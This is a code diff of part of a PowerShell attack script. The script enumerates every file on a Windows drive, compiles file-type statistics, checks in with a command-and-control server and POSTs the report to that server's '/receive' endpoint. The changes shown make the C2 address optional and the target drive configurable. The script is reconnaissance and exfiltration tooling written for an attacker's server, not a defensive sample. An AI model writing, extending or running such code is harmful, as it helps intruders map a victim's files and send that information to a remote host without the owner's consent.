@@ -4,7 +4,7 @@ Begin {
 $EnumerateTargets=@()
 $files=@()
 $AffectedFiles=@()
-$C2Server = '127.0.0.1' # ChangeMe
+$C2Server = '' # ChangeMe
 $C2Port = '1337' # ChangeMe
 $C2Schema = 'http://' # ChangeMe
 $C2Payload = ""
@@ -44,14 +44,15 @@ Write-Host $C2Payload
 
 
 # Attempt to reach the C2 Server
-Try {
-    $C2Status = Invoke-WebRequest -uri ($C2Schema + $C2Server + ":" + $C2Port + "/Status") -Method GET
-    Write-Verbose "C2 Connection: OK"
-} Catch {
-    Write-Warning "C2 Server is not reachable"
-    Exit(1)
+if($C2Server){
+    Try {
+        $C2Status = Invoke-WebRequest -uri ($C2Schema + $C2Server + ":" + $C2Port + "/Status") -Method GET
+        Write-Verbose "C2 Connection: OK"
+    } Catch {
+        Write-Warning "C2 Server is not reachable"
+        Exit(1)
+    }
 }
-
 
 
 Function ThreadedEnumeration {
@@ -163,7 +164,7 @@ Process{
     Write-Verbose -Message "Setting up Jobs..."
     
     # This is actually WAY faster than Get-ChildItem
-    $dir = cmd /r dir 'C:\' /s /b /a:-d
+    $dir = cmd /r dir $Drive /s /b /a:-d
 
     $chunks = Chunk-Array -objIn $dir -parts 150
 
@@ -336,7 +337,8 @@ $C2Payload += ($TopTenFileTypes | Out-String)
 End {
 
 # Post Output Report to C2 Server
-$null = Invoke-WebRequest -Uri ($C2Schema + $C2Server + ":" + $C2Port + "/receive") -Method POST -Body $C2Payload
-
+if ($C2Server){
+    $null = Invoke-WebRequest -Uri ($C2Schema + $C2Server + ":" + $C2Port + "/receive") -Method POST -Body $C2Payload
+}
 # Done
 }
